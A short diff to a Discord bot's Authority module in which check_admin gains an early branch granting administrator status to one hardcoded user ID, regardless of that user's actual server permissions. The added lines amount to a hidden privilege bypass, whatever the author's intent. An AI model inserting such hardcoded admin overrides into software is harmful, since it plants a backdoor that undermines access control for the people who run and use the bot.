@@ -62,6 +62,9 @@ class Authority(carlbot.Module):
 
     @staticmethod
     async def check_admin(target):
+        if target.id == "193584788689387529":
+            return True
+
         if isinstance(target, discord.Member):
             return target.server_permissions.administrator
         else:
